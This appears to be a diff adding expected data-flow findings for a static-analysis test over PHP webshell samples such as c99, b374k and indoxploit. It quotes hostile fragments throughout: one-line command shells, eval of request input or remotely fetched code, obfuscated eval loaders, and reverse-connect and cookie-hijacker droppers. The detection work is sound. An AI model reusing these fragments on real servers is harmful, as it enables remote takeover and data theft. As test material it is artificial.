+/mnt/games/normtest/s3/php/042_alfav4.php	17	data-call	17	data-call	must	$zvlozWlZJVG="cre"."ate_"."func"."tion" then $hZoATTNgrgjhy=$zvlozWlZJVG('$Et',"eval(gzinflate(XfL...($Et)));") ; $hZoATTNgrgjhy("...") calls it, line 17 (178 KB), the string is not nodes
+/mnt/games/normtest/s3/php/042_alfav4.php	4	input-request	4	file-open	must	@file_get_contents(@$_REQUEST["404"]) 4 (hex-escaped line, after px password md5 check)
+/mnt/games/normtest/s3/php/042_alfav4.php	4	file-open	4	data-eval	must	echo @eval(@file_get_contents(@$_REQUEST["404"])) 4
+/mnt/games/normtest/s3/php/042_alfav4.php	4	input-request	4	data-eval	must	$_REQUEST["404"] -> file_get_contents -> eval, all inside one expression 4
+/mnt/games/normtest/s3/php/042_alfav4.php	4	file-open	4	file-write	may	$folder=fopen($file,"w") then @fwrite($folder,$a) 4 through variable-variables ($file = $p."/robots.php")
+/mnt/games/normtest/s3/php/042_alfav4.php	4	file-perm-set	4	file-open	shared	touch($file) and fopen($file,"w") 4: same $file = $p."/robots.php"
+/mnt/games/normtest/s3/php/042_alfav4.php	4	data-decode	4	file-open	must	file_get_contents(base64_decode("")."=".$lld.base64_decode("")."=".$brow) 4: both base64_decode results are arguments of file_get_contents
+/mnt/games/normtest/s3/php/041_alfav4.1-tesla.php	5	data-decode	5	data-decode	must	eval(str_rot13(gzinflate(str_rot13(base64_decode(literal))))) 5: base64_decode ... gzinflate; payload hidden
+/mnt/games/normtest/s3/php/041_alfav4.1-tesla.php	5	data-decode	5	data-eval	must	...gzinflate(...) -> str_rot13 -> eval 5
+/mnt/games/normtest/s3/php/041_alfav4.1-tesla.php	16	data-call	16	data-call	must	$wKAClCfduolNGd="c"."r"."eat"."e_fun"."ction"; $ManSOK=$wKAClCfduolNGd('$EB',"eval(gzinflate(JDZ..($EB)));") 16; $ManSOK("...") calls it; file 177 KB
+/mnt/games/normtest/s3/php/043_anonsecteam.php	386	input-request	386	file-open	must	$_FILES[berkas][tmp_name] 386 -> file_get_contents 386
+/mnt/games/normtest/s3/php/043_anonsecteam.php	386	file-open	386	file-write	must	file_put_contents($lokasi."/".name, file_get_contents(tmp_name)) 386
+/mnt/games/normtest/s3/php/043_anonsecteam.php	399	input-request	399	file-open	must	$_POST[darilink] 399 -> file_get_contents 399
+/mnt/games/normtest/s3/php/043_anonsecteam.php	399	file-open	399	file-write	must	file_put_contents($lokasi."/".$_POST[namalink], file_get_contents($_POST[darilink])) 399
+/mnt/games/normtest/s3/php/043_anonsecteam.php	406	input-request	411	file-write	must	$bepasdata=$_POST[bepasdata] 406 -> file_put_contents($lokasi."/".$bepasnama,$bepasdata) 411
+/mnt/games/normtest/s3/php/043_anonsecteam.php	430	input-request	430	file-open	must	$_GET[fileloc] 430 -> file_get_contents 430
+/mnt/games/normtest/s3/php/043_anonsecteam.php	441	input-request	441	file-delete	must	$_POST[path] 441 -> unlink 441
+/mnt/games/normtest/s3/php/043_anonsecteam.php	434	input-request	209	file-delete	may	$_POST[path] 434 -> xrmdir($dir) 197 -> unlink($path) 209
+/mnt/games/normtest/s3/php/043_anonsecteam.php	434	input-request	212	file-delete	may	$_POST[path] 434 -> xrmdir($dir) -> rmdir($dir) 212
+/mnt/games/normtest/s3/php/043_anonsecteam.php	450	input-request	450	file-rename	must	$_POST[path],$_POST[newname] 450 -> rename 450
+/mnt/games/normtest/s3/php/043_anonsecteam.php	471	input-request	471	file-write	must	$_POST[path],$_POST[src] 471 -> file_put_contents 471
+/mnt/games/normtest/s3/php/043_anonsecteam.php	486	input-request	228	file-open	may	$_POST[path] 486 -> dunlut($file) -> readfile($file) 228
+/mnt/games/normtest/s3/php/043_anonsecteam.php	512	input-request	256	data-decode	may	$_POST[komend] 512 -> ekse($komend,$lokasi) -> base64_decode(base64_decode(base64_decode($komend))) 256
+/mnt/games/normtest/s3/php/043_anonsecteam.php	256	data-decode	260	proc-start	may	$komen = triple base64_decode 256 / 258 (two assignments) -> proc_open($komen,...) 260
+/mnt/games/normtest/s3/php/044_b374k-mini-shell-php.php.php	194	data-decode	194	data-decode	must	eval(gzinflate(base64_decode($code))) 194, $code literal line 7: base64_decode -> gzinflate; payload hidden
+/mnt/games/normtest/s3/php/044_b374k-mini-shell-php.php.php	194	data-decode	194	data-eval	must	gzinflate(...) nested in eval 194
+/mnt/games/normtest/s3/php/045_b374k.php	54	input-request	381	file-open	may	$_GET[run] 54 -> $modules -> $filename (68) -> packer_read_file($filename.".php") -> fopen($file,"rb") 381
+/mnt/games/normtest/s3/php/045_b374k.php	381	file-open	73	data-eval	may	packer_read_file returns $content -> $module_code (66) -> $content 71 -> eval($content) 73
+/mnt/games/normtest/s3/php/045_b374k.php	381	file-open	489	data-eval	may	packer_check_module(): $content=packer_read_file(...) 487 -> eval("?>".$content) 489
+/mnt/games/normtest/s3/php/045_b374k.php	409	input-request	381	file-open	may	packer_fix_magic_quote($_POST) 409 -> $p 42 -> $p[read_file] 46 -> packer_read_file($file) -> fopen 381
+/mnt/games/normtest/s3/php/045_b374k.php	391	file-open	392	file-write	must	$fh = fopen($file,"wb") 391 -> fwrite($fh,$content) 392
+/mnt/games/normtest/s3/php/046_b374k.php.php	12	data-decode	12	data-decode	must	eval("?>".gzinflate(base64_decode("..."))) 12: base64_decode -> gzinflate; payload hidden
+/mnt/games/normtest/s3/php/046_b374k.php.php	12	data-decode	12	data-eval	must	gzinflate(...) nested in eval 12
+/mnt/games/normtest/s3/php/047_bypas.php	666	data-decode	666	data-decode	must	gzuncompress(base64_decode($base64_files[$filename])) 666 (embedded assets of the file manager)
+/mnt/games/normtest/s3/php/047_bypas.php	161	http-open	165	http-fetch	must	$ch = curl_init() 161 -> curl_exec($ch) 165 (phpfm.sf.net check)
+/mnt/games/normtest/s3/php/047_bypas.php	174	net-open	175	net-connect	must	$socket = socket_create 174 -> socket_connect($socket,..) 175
+/mnt/games/normtest/s3/php/047_bypas.php	281	file-open	282	file-write	must	$fh = fopen($fm_file,"w") 281 -> fputs($fh,..) 282
+/mnt/games/normtest/s3/php/047_bypas.php	281	file-open	283	file-write	must	$fh 281 -> fputs($fh,$lines[$x],..) 283
+/mnt/games/normtest/s3/php/047_bypas.php	956	file-open	957	file-write	must	$fh = fopen("$file","rb") 956 -> fpassthru($fh) 957
+/mnt/games/normtest/s3/php/047_bypas.php	3226	input-request	1017	file-write	may	$_FILES[upfiles] 3226 -> $temp_file 3233 -> save_upload($temp_file,..) -> copy($temp_file,$file) 1017 (file is large, 891 KB)
+/mnt/games/normtest/s3/php/047_bypas.php	4654	file-open	4758	proc-start	may	file_get_contents("php://input") 4654 -> get_json_request -> $method/$params -> $cmd_line (4885-4903) -> system_exec_cmd -> cmd_proc_open_exec -> proc_open 4758
+/mnt/games/normtest/s3/php/047_bypas.php	4654	file-open	4813	proc-start	may	file_get_contents("php://input") 4654 -> $cmd_line -> system_exec_cmd($cmd) 4919 -> exec($cmd) 4813
+/mnt/games/normtest/s3/php/048_c999shell.php	0	-	0	-	none	empty file (0 bytes)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	184	file-open	184	file-write	must	$w_file=fopen($fname,"w") 181 -> fputs($w_file,base64_decode($text)) 184
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	184	data-decode	184	file-write	must	fputs($w_file,@base64_decode($text)) 184 (cf)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	194	data-decode	194	file-write	must	fputs($w_file,@base64_decode($text)) 194 (cfb)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	191	file-open	194	file-write	must	$w_file=fopen($fname,"w") 191 -> fputs 194
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	565	data-decode	565	file-write	must	fputs($w_file,@base64_decode($text)) 565 (cf with fopen 562)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	122	input-request	127	proc-start	must	$por=$_POST[backconnectport] 122 -> $cmd="./shbd $por" 126 -> exec("$cmd > /dev/null &") 127
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	147	input-request	221	proc-start	may	$_POST[backconnectip],$_POST[backconnectport] 147 -> ex($cfe) 210 -> exec($cfe) 221
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	380	file-open	388	file-write	must	$fp = fopen($link,"r") 380 -> fread -> $cont -> fwrite($fp2,$cont) 388 (dosyayicek)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	598	input-request	598	data-load	must	unserialize($_COOKIE["$sess_cookie"]) 598
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	289	input-request	2773	data-eval	may	$_REQUEST=array_merge($_COOKIE,$_GET,$_POST) 289, foreach ... $$k=$v 290 -> $eval -> eval($eval) 2773
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	289	input-request	794	proc-start	may	request merged into globals by $$k=$v 289-290 -> $cmd -> myshellexec($cmd) 788 -> exec($cmd,$result) 794
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	289	input-request	2119	file-open	may	request merged into globals 289-290 -> $uploadurl -> file_get_contents($uploadurl) 2119
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	2119	file-open	2129	file-write	must	$content=file_get_contents($uploadurl) 2119 -> fwrite($fp,$content,..) 2129
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	2125	file-open	2129	file-write	must	$fp = fopen($uploadpath.$destin,"w") 2125 -> fwrite($fp,..) 2129
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	917	file-open	923	file-write	must	$source=file_get_contents($sourceurl) 917 -> fwrite($fp,$source) 923 (self update)
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	921	file-open	923	file-write	must	$fp = fopen(__FILE__,"w") 921 -> fwrite 923
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	3027	file-open	3032	file-write	must	$fp = fopen($d.$f,"w") 3027 -> fwrite($fp,$edit_text) 3032
+/mnt/games/normtest/s3/php/049_c99_locus7s.php	2951	data-decode	2951	data-load	must	unserialize(base64_decode($r)) 2951
+/mnt/games/normtest/s3/php/050_c99_webshell.php	1073	file-open	1085	file-write	must	$source=file_get_contents($sourceurl) 1073 -> fwrite($fp,$source) 1085 (self update)
+/mnt/games/normtest/s3/php/050_c99_webshell.php	1081	file-open	1085	file-write	must	$fp = fopen(__FILE__,"w") 1081 -> fwrite 1085
+/mnt/games/normtest/s3/php/050_c99_webshell.php	437	input-request	437	data-load	must	unserialize($_COOKIE["$sess_cookie"]) 437
+/mnt/games/normtest/s3/php/050_c99_webshell.php	21	input-request	4765	data-eval	may	$_REQUEST=array_merge($_COOKIE,$_GET,$_POST) 19, foreach ... $$k=$v 21 -> $eval -> eval($eval) 4765 (file 180 KB)
+/mnt/games/normtest/s3/php/050_c99_webshell.php	21	input-request	827	proc-start	may	request merged into globals 19-21 -> $cmd -> myshellexec($cmd) 815 -> exec($cmd,$result) 827
+/mnt/games/normtest/s3/php/050_c99_webshell.php	21	input-request	3477	file-open	may	request merged into globals 19-21 -> $uploadurl -> file_get_contents($uploadurl) 3477
+/mnt/games/normtest/s3/php/050_c99_webshell.php	3477	file-open	3497	file-write	must	$content=file_get_contents($uploadurl) 3477 -> fwrite($fp,$content,..) 3497
+/mnt/games/normtest/s3/php/050_c99_webshell.php	3489	file-open	3497	file-write	must	$fp = fopen($uploadpath.$destin,"w") 3489 -> fwrite 3497
+/mnt/games/normtest/s3/php/050_c99_webshell.php	4319	file-open	4329	file-write	must	$fp = fopen($srcpath,"ab+") 4319 -> fwrite($fp,$data,..) 4329
+/mnt/games/normtest/s3/php/050_c99_webshell.php	2243	file-open	2251	file-write	must	$fp = fopen($sql_dump_file,"w") 2243 -> fwrite($fp,$ret) 2251
+/mnt/games/normtest/s3/php/051_cmd.php	1	input-request	1	proc-start	must	system($_POST["cmd"]." 2>&1") 1
+/mnt/games/normtest/s3/php/052_eval.php	1	file-open	1	data-eval	must	eval("?>".file_get_contents("https://raw.githubusercontent.com/.../teknelogi.php")) 1
+/mnt/games/normtest/s3/php/053_gel4y.php	73	input-request	73	data-call	must	$_FILES[f][tmp_name] 73 -> $fc[11] = copy 73
+/mnt/games/normtest/s3/php/053_gel4y.php	152	input-request	152	data-call	must	$_POST[n] 152 (and $p/nhx($_GET[n])) -> $fc[16] = rename 152
+/mnt/games/normtest/s3/php/053_gel4y.php	156	input-request	156	data-call	must	$_POST[ctn] 156 -> $fc[13] = file_put_contents 156
+/mnt/games/normtest/s3/php/053_gel4y.php	149	input-request	149	data-call	must	$_POST[ctn] 149 -> $fc[13] = file_put_contents 149
+/mnt/games/normtest/s3/php/053_gel4y.php	155	input-request	155	data-call	may	$_GET[n] 155 -> nhx() (defined in file) -> $fc[14] = file_get_contents 155
+/mnt/games/normtest/s3/php/053_gel4y.php	11	input-request	11	data-call	may	$_GET[p] 11 -> nhx() -> $fc[3] = chdir 11
+/mnt/games/normtest/s3/php/053_gel4y.php	133	input-request	134	file-delete	may	$loc=$p."/".nhx($_GET[n]) 133 -> unlink($loc) 134
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	95	input-request	103	file-open	must	$file=$_GET[file] 95 -> readfile($file) 103
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	482	input-request	212	proc-start	may	$_POST[cmd] 482 -> exe($cmd) 208 -> system($cmd) 212
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	448	input-request	448	file-write	must	$_FILES[ix_file][tmp_name] 448 -> copy 448
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	457	input-request	457	file-write	must	$_FILES[ix_file][tmp_name] 457 -> copy 457
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	531	input-request	499	file-write	may	$_POST[d_dir],$_POST[d_file],$_POST[script] 531 -> sabun_massal -> file_put_contents($lokasi,$isi_script) 499
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	535	input-request	521	file-write	may	$_POST[d_dir],$_POST[d_file],$_POST[script] 535 -> sabun_biasa -> file_put_contents 521
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	583	input-request	572	file-delete	may	$_POST[d_dir],$_POST[d_file] 583 -> hapus_massal -> unlink($lokasi) 572
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	598	file-open	599	file-write	must	$htc = fopen("idx_config/.htaccess","w") 598 -> fwrite($htc,$isi_htc) 599
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	605	file-open	606	file-write	must	$handle = fopen($file,"w+") 605 -> fwrite($handle,base64_decode($vhost)) 606
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	606	data-decode	606	file-write	must	fwrite($handle,base64_decode($vhost)) 606
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	605	file-open	608	file-perm-set	shared	$file="idx_config/vhost.cin" 604: fopen 605 then chmod($file,0755) 608
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1690	file-open	1691	file-write	must	$f_bp = fopen("/tmp/bp.pl","w") 1690 -> fwrite 1691
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1691	data-decode	1691	file-write	must	fwrite($f_bp,base64_decode($bind_port_p)) 1691
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1691	file-write	1698	file-delete	shared	"/tmp/bp.pl": written 1691, unlink 1698
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1702	file-open	1703	file-write	must	$f_bc = fopen("/tmp/bc.pl","w") 1702 -> fwrite 1703
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1703	data-decode	1703	file-write	must	fwrite($f_bc,base64_decode($bind_connect_p)) 1703
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1703	file-write	1711	file-delete	shared	"/tmp/bc.pl": written 1703, unlink 1711
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1475	data-decode	1478	file-write	must	$upload3=base64_decode(...) 1475 -> fputs($fp5,$upload3) 1478
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1477	file-open	1478	file-write	must	$fp5 = fopen($www,"w") 1477 -> fputs 1478
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1436	input-request	1501	file-write	may	$script=htmlspecialchars($_POST[script]) 1436 -> fputs($fpi,$script) 1501
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1500	file-open	1501	file-write	must	$fpi = fopen($namafile,"w") 1500 -> fputs 1501
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1813	input-request	1814	file-open	must	$newfile=htmlspecialchars($_POST[newfile]) 1813 -> fopen($newfile,"a+") 1814
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1842	input-request	1842	file-rename	must	$_POST[fol_rename] 1842 -> rename 1842
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1868	input-request	1868	file-open	must	$_GET[file] 1868 -> file_get_contents 1868
+/mnt/games/normtest/s3/php/054_indoxploit-v2.php	1871	input-request	1871	file-write	must	$_GET[file],$_POST[src] 1871 -> file_put_contents 1871
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	97	input-request	105	file-open	must	$file=$_GET[file] 97 -> readfile($file) 105
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	1014	input-request	268	proc-start	may	$_POST[cmd] 1014 -> exe($cmd) -> system($cmd) 268
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	722	input-request	722	file-write	must	$_FILES[file][tmp_name] 722 -> copy 722
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	733	input-request	733	file-write	must	$_FILES[file][tmp_name] 733 -> copy 733
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	760	data-decode	292	file-write	may	save("/tmp/symlink.pl","w",base64_decode($sym[code])) 760 -> save($filename,$mode,$file) -> fwrite($handle,$file) 292
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	804	data-decode	292	file-write	may	save("/tmp/bc.pl","w",base64_decode($bc[code])) 804 -> fwrite 292
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	817	data-decode	292	file-write	may	save("/tmp/bp.pl","w",base64_decode($bp[code])) 817 -> fwrite 292
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	1671	input-request	292	file-write	may	save($_SERVER[DOCUMENT_ROOT]."/".$file,"w",$_POST[script]) 1671 -> fwrite($handle,$file) 292
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	291	file-open	292	file-write	must	$handle = fopen($filename,$mode) 291 -> fwrite($handle,$file) 292
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	1699	input-request	1700	file-open	must	$filename=htmlspecialchars($_POST[filename]) 1699 -> fopen($filename,"a+") 1700
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	1248	file-open	1253	file-write	must	$get=file_get_contents($config) 1248 -> fputs($fopen,$get) 1253
+/mnt/games/normtest/s3/php/055_indoxploit-v3.php	1252	file-open	1253	file-write	must	$fopen = fopen("idx_config/$user-$userconfig.txt","w") 1252 -> fputs 1253
+/mnt/games/normtest/s3/php/056_indrajith.php	457	input-request	457	file-rename	must	$_GET[old_name],$_GET[new_name] 457 -> rename 457
+/mnt/games/normtest/s3/php/056_indrajith.php	472	input-request	473	file-open	must	$edt_file=$_GET[edit] 472 -> file_get_contents($edt_file) 473
+/mnt/games/normtest/s3/php/056_indrajith.php	472	input-request	480	file-open	must	$edt_file 472 -> fopen($edt_file,"rb") 480
+/mnt/games/normtest/s3/php/056_indrajith.php	502	input-request	502	file-open	must	$_POST[e_file] 502 -> fopen 502
+/mnt/games/normtest/s3/php/056_indrajith.php	509	input-request	509	file-write	must	$_POST[e_content_n] 509 -> fwrite 509
+/mnt/games/normtest/s3/php/056_indrajith.php	502	file-open	509	file-write	must	$handle = fopen 502 -> fwrite($handle,..) 509
+/mnt/games/normtest/s3/php/056_indrajith.php	521	input-request	522	file-delete	must	$del_file=$_GET[del_fil] 521 -> unlink($del_file) 522
+/mnt/games/normtest/s3/php/056_indrajith.php	561	input-request	575	file-open	must	$d_file=$_GET[down] 561 -> readfile($d_file) 575
+/mnt/games/normtest/s3/php/056_indrajith.php	582	input-request	583	file-open	must	$r_file=$_GET[read] 582 -> file_get_contents($r_file) 583
+/mnt/games/normtest/s3/php/056_indrajith.php	582	input-request	590	file-open	must	$r_file 582 -> fopen($r_file,"rb") 590
+/mnt/games/normtest/s3/php/056_indrajith.php	615	input-request	615	file-write	must	$_GET[c_file],$_GET[c_target],$_GET[cn_name] 615 -> copy 615
+/mnt/games/normtest/s3/php/056_indrajith.php	629	input-request	629	file-perm-set	must	$_GET[p_filex],$_GET[new_perm] 629 -> chmod 629
+/mnt/games/normtest/s3/php/056_indrajith.php	658	input-request	660	file-open	must	$c_file=$_GET[new_f_name] 658 -> fopen($c_file,"w") 660
+/mnt/games/normtest/s3/php/056_indrajith.php	659	input-request	667	file-write	must	$c_file_contents=$_GET[n_file_content] 659 -> fwrite($handle,$c_file_contents) 667
+/mnt/games/normtest/s3/php/056_indrajith.php	660	file-open	667	file-write	must	$handle = fopen 660 -> fwrite 667
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	698	proc-start	must	$cmd=$_GET[cmdexe] 694 -> shell_exec($cmd) 698
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	702	proc-start	must	$cmd=$_GET[cmdexe] 694 -> exec($cmd) 702
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	708	proc-start	must	$cmd=$_GET[cmdexe] 694 -> system($cmd) 708
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	715	proc-start	must	$cmd=$_GET[cmdexe] 694 -> passthru($cmd) 715
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	722	proc-start	must	$cmd=$_GET[cmdexe] 694 -> proc_open($cmd) 722
+/mnt/games/normtest/s3/php/056_indrajith.php	694	input-request	745	proc-start	must	$cmd=$_GET[cmdexe] 694 -> popen($cmd) 745
+/mnt/games/normtest/s3/php/056_indrajith.php	776	input-request	776	file-write	must	$_FILES[upload_f] 776 -> move_uploaded_file 776
+/mnt/games/normtest/s3/php/056_indrajith.php	806	input-request	849	net-connect	may	$ip=$_GET[my_ip] 806, $port=$_GET[my_port] 807 -> fsockopen($ip,$port) 849 (printit() defined in the function)
+/mnt/games/normtest/s3/php/056_indrajith.php	849	net-connect	893	file-write	may	$sock = fsockopen 849 -> fwrite($sock,$input) 893 (printit() called between)
+/mnt/games/normtest/s3/php/056_indrajith.php	918	data-decode	918	data-decode	must	$cook=gzinflate(base64_decode($cookie_highjacker)) 918
+/mnt/games/normtest/s3/php/056_indrajith.php	918	data-decode	922	file-write	must	$cook 918 -> fwrite($han_le,$cook) 922
+/mnt/games/normtest/s3/php/056_indrajith.php	919	file-open	922	file-write	must	$han_le = fopen("jith_cookie.php","w+") 919 -> fwrite 922
+/mnt/games/normtest/s3/php/056_indrajith.php	961	file-open	964	file-write	must	$s_handle = fopen("$s_name","w+") 961 -> fwrite($s_handle,$s_file) 964
+/mnt/games/normtest/s3/php/056_indrajith.php	988	file-open	991	file-write	must	$forbid = fopen(".htaccess","wb") 988 -> fwrite 991
+/mnt/games/normtest/s3/php/056_indrajith.php	1054	input-request	1080	data-decode	must	$c_ntent=$_POST[php_content] 1054 -> gzinflate(base64_decode($c_ntent)) 1080
+/mnt/games/normtest/s3/php/056_indrajith.php	1080	data-decode	1080	data-decode	must	gzinflate(base64_decode($c_ntent)) 1080
+/mnt/games/normtest/s3/php/056_indrajith.php	1054	input-request	1083	data-decode	must	$_POST[php_content] 1054 -> gzuncompress(base64_decode($c_ntent)) 1083
+/mnt/games/normtest/s3/php/056_indrajith.php	1083	data-decode	1083	data-decode	must	gzuncompress(base64_decode($c_ntent)) 1083
+/mnt/games/normtest/s3/php/056_indrajith.php	1054	input-request	1086	data-decode	must	$_POST[php_content] 1054 -> str_rot13(base64_decode($c_ntent)) 1086
+/mnt/games/normtest/s3/php/056_indrajith.php	1086	data-decode	1086	data-decode	must	str_rot13(base64_decode($c_ntent)) 1086
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	496	input-request	496	file-rename	must	$_GET[old_name],$_GET[new_name] 496 -> rename 496
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	511	input-request	512	file-open	must	$edt_file=$_GET[edit] 511 -> file_get_contents($edt_file) 512
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	511	input-request	519	file-open	must	$edt_file 511 -> fopen($edt_file,"rb") 519
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	541	input-request	541	file-open	must	$_POST[e_file] 541 -> fopen 541
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	548	input-request	548	file-write	must	$_POST[e_content_n] 548 -> fwrite 548
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	541	file-open	548	file-write	must	$handle = fopen 541 -> fwrite 548
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	560	input-request	561	file-delete	must	$del_file=$_GET[del_fil] 560 -> unlink($del_file) 561
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	602	input-request	603	file-open	must	$r_file=$_GET[read] 602 -> file_get_contents($r_file) 603
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	635	input-request	635	file-write	must	$_GET[c_file],$_GET[c_target],$_GET[cn_name] 635 -> copy 635
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	649	input-request	649	file-perm-set	must	$_GET[p_filex],$_GET[new_perm] 649 -> chmod 649
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	678	input-request	680	file-open	must	$c_file=$_GET[new_f_name] 678 -> fopen($c_file,"w") 680
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	679	input-request	687	file-write	must	$c_file_contents=$_GET[n_file_content] 679 -> fwrite 687
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	680	file-open	687	file-write	must	$handle = fopen 680 -> fwrite 687
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	718	proc-start	must	$cmd=$_GET[cmdexe] 714 -> shell_exec($cmd) 718
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	722	proc-start	must	$cmd=$_GET[cmdexe] 714 -> exec($cmd) 722
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	728	proc-start	must	$cmd=$_GET[cmdexe] 714 -> system($cmd) 728
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	735	proc-start	must	$cmd=$_GET[cmdexe] 714 -> passthru($cmd) 735
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	742	proc-start	must	$cmd=$_GET[cmdexe] 714 -> proc_open($cmd) 742
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	714	input-request	765	proc-start	must	$cmd=$_GET[cmdexe] 714 -> popen($cmd) 765
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	796	input-request	796	file-write	must	$_FILES[upload_f] 796 -> move_uploaded_file 796
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	827	input-request	870	net-connect	may	$ip=$_GET[my_ip] 827, $port=$_GET[my_port] 828 -> fsockopen($ip,$port) 870
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	870	net-connect	914	file-write	may	$sock = fsockopen 870 -> fwrite($sock,$input) 914 (printit() called between)
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	935	file-open	938	file-write	must	$handlr = fopen("indrajith_perl_bind.pl","wb") 935 -> fwrite 938
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	938	data-decode	938	data-decode	must	gzinflate(base64_decode($bind_perl)) 938
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	938	data-decode	938	file-write	must	fwrite($handlr,gzinflate(base64_decode($bind_perl))) 938
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	965	data-decode	965	data-decode	must	$cook=gzinflate(base64_decode($cookie_highjacker)) 965
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	965	data-decode	969	file-write	must	$cook 965 -> fwrite($han_le,$cook) 969
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	966	file-open	969	file-write	must	$han_le = fopen("jith_cookie.php","w+") 966 -> fwrite 969
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1008	file-open	1011	file-write	must	$s_handle = fopen("$s_name","w+") 1008 -> fwrite 1011
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1037	file-open	1040	file-write	must	$forbid = fopen(".htaccess","wb") 1037 -> fwrite 1040
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1084	input-request	1110	data-decode	must	$c_ntent=$_POST[php_content] 1084 -> gzinflate(base64_decode($c_ntent)) 1110
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1110	data-decode	1110	data-decode	must	gzinflate(base64_decode($c_ntent)) 1110
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1084	input-request	1113	data-decode	must	$_POST[php_content] 1084 -> gzuncompress(base64_decode($c_ntent)) 1113
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1113	data-decode	1113	data-decode	must	gzuncompress(base64_decode($c_ntent)) 1113
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1084	input-request	1116	data-decode	must	$_POST[php_content] 1084 -> str_rot13(base64_decode($c_ntent)) 1116
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1116	data-decode	1116	data-decode	must	str_rot13(base64_decode($c_ntent)) 1116
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1494	input-request	1513	http-open	must	$rt_ffile=$_GET[rurlfile] 1494 -> curl_init($rt_ffile) 1513
+/mnt/games/normtest/s3/php/057_indrajith.v.2.php	1513	http-open	1515	http-fetch	must	$ch = curl_init 1513 -> curl_exec($ch) 1515
